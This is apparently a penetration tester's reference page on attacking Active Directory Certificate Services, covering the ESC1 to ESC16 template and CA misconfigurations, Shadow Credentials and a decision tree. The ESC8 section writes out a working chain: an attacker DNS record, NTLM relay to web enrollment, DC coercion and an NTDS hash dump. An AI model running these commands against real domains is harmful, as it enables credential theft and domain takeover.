+++
title = "AD: ADCS Attack Reference"
+++

# ADCS Attack Reference

- https://specterops.io/blog/2022/06/13/certificates-and-pwnage-and-patches/
- https://github.com/ly4k/Certipy
- https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6

## Setup

{{< embed-section page="Docs/9 - Notes/certipy" header="installation" >}}

## Triage

{{< embed-section page="Docs/9 - Notes/certipy" header="enumeration" >}}

**Read the output top-down: CA-level vulnerabilities appear under the CA block; template-level vulnerabilities appear under each template block.**

| `[!] Vulnerabilities:` value | Where in output | Key field to confirm |
| --- | --- | --- |
| `ESC1` | Template block | `Enrollee Supplies Subject: True` + `Client Authentication: True` |
| `ESC2` | Template block | `Extended Key Usage: Any Purpose` or empty EKU |
| `ESC3` | Template block | `Extended Key Usage: Certificate Request Agent` |
| `ESC4` | Template block | `Permissions` shows Write rights for low-priv principal |
| `ESC6` | CA block | `User Specified SAN: Enabled` (`EDITF_ATTRIBUTESUBJECTALTNAME2`) |
| `ESC7` | CA block | `Permissions` shows `ManageCA` or `ManageCertificates` for low-priv principal |
| `ESC8` | CA block | `Web Enrollment: Enabled` |
| `ESC16` | Template block | `No Security Extension: Enabled` on a template with Client Authentication EKU |

## ESC1: User-controllable SAN

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/

**Signal:** Template block shows `Enrollee Supplies Subject: True` + `Client Authentication: True` + low-privilege principals in `Enrollment Rights`.

**Why it works:** When `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is set, the requester controls the Subject Alternative Name (SAN) field. The DC resolves identity from the SAN UPN, not the requester's actual identity. PKINIT uses this SAN to issue a TGT for whoever is named — no password required.

{{< embed-section page="Docs/9 - Notes/certipy" header="enroll-with-san" >}}
{{< embed-section page="Docs/9 - Notes/certipy" header="authentication" >}}

---

## ESC2: Any Purpose EKU

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/

**Signal:** Template block shows `Extended Key Usage: Any Purpose` or no EKU at all, with low-privilege enrollment rights.

**Why it works:** Any Purpose EKU allows the certificate to satisfy any extended key usage check, including the Certificate Request Agent EKU used for enrollment agent operations. The CA does not enforce that enrollment agent certs carry the specific OID, so this cert can be misused to enroll on behalf of other users.

**Step 1** -- Enroll using the Any Purpose template:

{{< embed-section page="Docs/9 - Notes/certipy" header="enroll-base-certificate" >}}

**Step 2** -- Use that cert as an enrollment agent to request on behalf of Administrator:

{{< embed-section page="Docs/9 - Notes/certipy" header="enroll-on-behalf-of-user" >}}
{{< embed-section page="Docs/9 - Notes/certipy" header="authentication" >}}

---

## ESC3: Enrollment Agent Abuse

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/

**Signal:** Template block shows `Extended Key Usage: Certificate Request Agent` with low-privilege enrollment rights. Often paired with a second template that Enrollment Agents are authorized to enroll in.

**Why it works:** A Certificate Request Agent cert lets the holder enroll for certificates on behalf of any other user. AD CS trusts the agent cert and issues the resulting certificate in the target user's name, which can then be used for PKINIT authentication.

**Step 1** -- Enroll to get the Enrollment Agent cert:

{{< embed-section page="Docs/9 - Notes/certipy" header="enroll-base-certificate" >}}

**Step 2** -- Use agent cert to enroll on behalf of Administrator:

{{< embed-section page="Docs/9 - Notes/certipy" header="enroll-on-behalf-of-user" >}}
{{< embed-section page="Docs/9 - Notes/certipy" header="authentication" >}}

**NOTE:** `-on-behalf-of` takes the NetBIOS domain name (`CORP\Administrator`), not the FQDN. The second template (`User` here) must be one that Enrollment Agents are authorized to use.

---

## ESC4: Vulnerable Template ACL

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/

**Signal:** Template block `Permissions` shows `WriteDacl`, `WriteOwner`, or `WriteProperty` rights for a low-privilege principal on the template object.

**Why it works:** Write access to the template AD object lets you modify its properties — specifically enabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` and adding low-privilege enrollment rights, converting the template into an ESC1-vulnerable state.

**Step 1** -- Back up original template config:

{{< embed-section page="Docs/9 - Notes/certipy" header="save-template" >}}

**Step 2** -- Overwrite template with ESC1-vulnerable configuration:

{{< embed-section page="Docs/9 - Notes/certipy" header="write-default-configuration" >}}

**Step 3** -- Exploit as ESC1:

{{< embed-section page="Docs/9 - Notes/certipy" header="enroll-with-san" >}}

**Step 4** -- Restore original template (OpSec):

{{< embed-section page="Docs/9 - Notes/certipy" header="restore-template" >}}
{{< embed-section page="Docs/9 - Notes/certipy" header="authentication" >}}

---

## ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/

**Signal:** CA block shows `User Specified SAN: Enabled`. CA-level flag — applies to all templates on that CA.

**Why it works:** `EDITF_ATTRIBUTESUBJECTALTNAME2` tells the CA to honor the SAN field from the requester on any certificate request, regardless of whether the template enables `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`. Any template with Client Authentication EKU and low-privilege enrollment rights becomes exploitable.

Any Client Authentication template works — not just explicitly vulnerable ones:

{{< embed-section page="Docs/9 - Notes/certipy" header="enroll-with-san" >}}
{{< embed-section page="Docs/9 - Notes/certipy" header="authentication" >}}

---

## ESC7: Vulnerable CA ACL

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
- https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6

**Signal:** CA block `Permissions` shows `ManageCA` or `ManageCertificates` for a low-privilege principal.

**Why it works:** `ManageCertificates` (Officer role) lets you approve denied certificate requests. `ManageCA` lets you grant yourself the Officer role. The SubCA template allows specifying a SAN but always denies low-privilege requests — an Officer can force-issue that denied request and then retrieve it.

**Step 1** -- Grant yourself the Officer role (requires ManageCA):

{{< embed-section page="Docs/9 - Notes/certipy" header="add-officer" >}}

**Step 2** -- Enable SubCA template on the CA:

{{< embed-section page="Docs/9 - Notes/certipy" header="enable-template" >}}

**Step 3** -- Request as Administrator; will be DENIED. Note the Request ID in output:

{{< embed-section page="Docs/9 - Notes/certipy" header="enroll-with-san" >}}

**Step 4** -- Force-issue the denied request using Officer rights:

{{< embed-section page="Docs/9 - Notes/certipy" header="issue-request" >}}

**Step 5** -- Retrieve the issued certificate:

{{< embed-section page="Docs/9 - Notes/certipy" header="retrieve-by-request-id" >}}
{{< embed-section page="Docs/9 - Notes/certipy" header="authentication" >}}

**NOTE:** If you only have `ManageCertificates` (not `ManageCA`), skip Step 1. If you only have `ManageCA`, run Step 1 first to grant yourself `ManageCertificates`, then proceed.

---

## ESC8: NTLM Relay to HTTP Enrollment

- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc8-ntlm-relay-to-ad-cs-web-enrollment
- https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html
    - https://github.com/CICADA8-Research/RemoteKrbRelay

**Signal:** CA block shows `Web Enrollment: Enabled`. The endpoint `http://<CA_NAME>/certsrv/` is accessible over HTTP, not HTTPS.

**Why it works:** The ADCS Web Enrollment endpoint (`/certsrv/certfnsh.asp`) accepts NTLM authentication over HTTP. HTTP NTLM is relay-able because Extended Protection for Authentication (EPA / channel binding) is not enforced by default on HTTP (only on HTTPS). Coercing a DC's machine account to authenticate to the attacker and relaying those credentials to the CA yields a DC certificate, which enables PKINIT as the DC and leads to DCSync.

```bash
# Add DNS magic record
# <host><empty CREDENTIAL_TARGET_INFORMATION structure>
KRB5CCNAME=<TGT> bloodyAD -k -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC_FQDN> add dnsRecord <DC_HOSTNAME>UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <ATTACKER_IP>

# Start relay to get auth, forward to AD, and get cert
# NOTE: Must run sudo for tcp/445 on tun0
sudo uv run certipy relay -template DomainController -interface <ATTACKER_IP> -target 'http://<DC_FQDN>/'
```

```bash
# Check coerced auth techniques
KRB5CCNAME=<TGT> nxc smb <TARGET> --use-kcache -k -M coerce_plus

# Trigger auth request (using magic DNS record)
KRB5CCNAME=<TGT> nxc smb <DC_FQDN> --use-kcache -k -M coerce_plus -o METHOD=<TECHNIQUE> LISTENER=<DC_HOSTNAME>UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
# dumps a <DC_HOSTNAME>.pfx for DC$ machine acct

# Get TGT
nxc smb <DC_FQDN> --pfx-cert dc-<DC_HOSTNAME>.pfx -u '<DC_HOSTNAME>$' --generate-tgt '<DC_HOSTNAME>$'

# Pwnd
KRB5CCNAME=~/my_data/'<DC_HOSTNAME>$.ccache' nxc smb <DC_FQDN> --use-kcache -k --ntds
```

---

## Shadow Credentials

Requires `GenericWrite` or `AddKeyCredentialLink` on the target account. Writes a Key Credential to the target's `msDS-KeyCredentialLink` attribute, then uses PKINIT to authenticate and retrieve the NT hash. Does not modify the password.

{{< embed-section page="Docs/9 - Notes/certipy" header="shadow-credentials" >}}

---

## ESC16: UPN Impersonation

**Signal:** Template block shows `No Security Extension: Enabled` on a template with Client Authentication EKU.

**Why it works:** When the `szOID_NTDS_CA_SECURITY_EXT` extension is absent from a template, the issued certificate does not bind to the requester's SID. The DC resolves the identity from the UPN in the certificate instead. By temporarily changing the target's UPN to match a privileged user, you can request a certificate that authenticates as that privileged user.

**Prereqs:** Write access to the target account's `userPrincipalName` attribute (`GenericWrite`, `GenericAll`, or `WriteProperty`). Combine with Shadow Credentials to get the NT hash needed for authentication.

Enumerate ADCS for vulnerable templates and CAs:

{{< embed-section page="Docs/9 - Notes/certipy" header="enumeration" >}}

Read target account's AD attributes:

{{< embed-section page="Docs/9 - Notes/certipy" header="read-account" >}}

Change target's UPN to impersonate a privileged user:

{{< embed-section page="Docs/9 - Notes/certipy" header="update-upn" >}}

Request certificate as the impersonated user:

{{< embed-section page="Docs/9 - Notes/certipy" header="enroll-with-hash-auth" >}}

Revert UPN back to original after certificate is issued:

{{< embed-section page="Docs/9 - Notes/certipy" header="revert-upn" >}}

Authenticate with the certificate -- extract TGT and NT hash:

{{< embed-section page="Docs/9 - Notes/certipy" header="authentication" >}}

---

## Decision Tree

| certipy find shows | ESC | First move |
| --- | --- | --- |
| Template: `Enrollee Supplies Subject: True` + `Client Authentication: True` + low-priv enrollment | ESC1 | `certipy req ... -template <TEMPLATE_NAME> -upn administrator@<DOMAIN>` |
| Template: `Extended Key Usage: Any Purpose` (or empty) + low-priv enrollment | ESC2 | Enroll → use resulting cert with `-pfx` + `-on-behalf-of '<DOMAIN>\Administrator'` |
| Template: `Extended Key Usage: Certificate Request Agent` + low-priv enrollment | ESC3 | Enroll for agent cert → `req ... -pfx <agent.pfx> -on-behalf-of '<DOMAIN>\Administrator'` |
| Template: `WriteDacl`/`WriteOwner`/`WriteProperty` for low-priv principal | ESC4 | `certipy template ... -write-default-configuration` → ESC1 chain |
| CA: `User Specified SAN: Enabled` | ESC6 | `certipy req ... -template User -upn administrator@<DOMAIN>` |
| CA: `ManageCA` or `ManageCertificates` for low-priv principal | ESC7 | `certipy ca ... -add-officer <USER>` → SubCA deny → force-issue → retrieve |
| CA: `Web Enrollment: Enabled` (HTTP) | ESC8 | `ntlmrelayx --adcs -t http://<TARGET_IP>/certsrv/certfnsh.asp` → coerce DC |
| Template: `No Security Extension: Enabled` + Client Auth EKU | ESC16 | Shadow Creds → get NT hash → change UPN → `certipy req` → revert UPN → `certipy auth` |

**All ESC paths converge here:**

{{< embed-section page="Docs/9 - Notes/certipy" header="authentication" >}}

```bash
# NT hash → evil-winrm -H <NT_HASH> / impacket-secretsdump / psexec
```

---
